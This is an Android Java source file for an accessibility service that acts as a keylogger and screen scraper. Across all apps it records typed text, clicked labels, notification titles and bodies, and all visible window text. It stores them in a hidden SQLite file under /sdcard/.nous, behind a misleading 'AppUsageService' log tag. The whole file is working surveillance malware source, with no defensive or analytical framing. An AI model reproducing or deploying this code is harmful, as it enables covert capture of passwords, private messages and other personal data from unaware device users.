package com.capture;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteStatement;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.app.Notification;

import java.io.File;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "AppUsageService";
    private static final String DATABASE_PATH = "/sdcard/.nous/key.sql";
    private static final int MAX_BUFFER_SIZE = 25;
    private final StringBuilder currentKeyEvents = new StringBuilder();
    private final Set<String> createdTables = new HashSet<>();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        String packageName = (event.getPackageName() != null) ? event.getPackageName().toString() : "unknown_app";

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChangedEvent(event, packageName);
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                handleNotificationChangedEvent(event, packageName);
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                handleTypeViewEvent(event, packageName);
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                logAllTexts(packageName);
                break;
        }
    }

    private void logAllTexts(String packageName) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            StringBuilder stringBuilder = new StringBuilder();
            traverseNode(rootNode, stringBuilder);
            String allTexts = stringBuilder.toString();

            if (!allTexts.trim().isEmpty()) {
                currentKeyEvents.append("Texts: \n").append(allTexts).append("\n");

                if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                    saveBufferToSQLite(packageName);
                }
            }
        }
    }

    private void traverseNode(AccessibilityNodeInfo node, StringBuilder stringBuilder) {
        if (node == null) return;

        if (node.getText() != null) {
            stringBuilder.append(node.getText().toString()).append("\n");
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            traverseNode(node.getChild(i), stringBuilder);
        }
    }

    private void handleTextChangedEvent(AccessibilityEvent event, String packageName) {
        List<CharSequence> textList = event.getText();
        for (CharSequence text : textList) {
            String newText = text.toString();
            currentKeyEvents.append("Typed: ").append(newText).append("\n");
        }

        if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
            saveBufferToSQLite(packageName);
        }
    }

    private void handleNotificationChangedEvent(AccessibilityEvent event, String packageName) {
        Notification notification = (Notification) event.getParcelableData();
        if (notification != null) {
            Bundle extras = notification.extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            String text = extras.getString(Notification.EXTRA_TEXT, "");

            if (!text.isEmpty()) {
                currentKeyEvents.append("Notification: ").append(title).append(" - ").append(text).append("\n");

                if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                    saveBufferToSQLite(packageName);
                }
            }
        }
    }

    private void handleTypeViewEvent(AccessibilityEvent event, String packageName) {
        List<CharSequence> textList = event.getText();
        for (CharSequence text : textList) {
            currentKeyEvents.append("Clicked: ").append(text.toString()).append("\n");
        }

        if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
            saveBufferToSQLite(packageName);
        }
    }

    private void saveBufferToSQLite(String packageName) {
        try {
            File dbFile = new File(DATABASE_PATH);
            if (!dbFile.getParentFile().exists()) {
                dbFile.getParentFile().mkdirs();
            }

            SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(DATABASE_PATH, null);
            String tableName = packageName.replace(".", "_");

            if (!createdTables.contains(tableName)) {
                String createTableQuery = "CREATE TABLE IF NOT EXISTS " + tableName + 
					" (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, data TEXT)";
                db.execSQL(createTableQuery);
                createdTables.add(tableName);
            }

            SQLiteStatement stmt = db.compileStatement("INSERT INTO " + tableName + " (timestamp, data) VALUES (?, ?)");
            stmt.bindString(1, String.valueOf(System.currentTimeMillis()));
            stmt.bindString(2, currentKeyEvents.toString());
            stmt.executeInsert();

            db.close();
            currentKeyEvents.setLength(0);
        } catch (Exception e) {
            Log.e(TAG, "SQLite Error: " + e.getMessage());
        }
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
    }

    @Override
    public void onInterrupt() {
        // Interrupção do serviço
    }
}
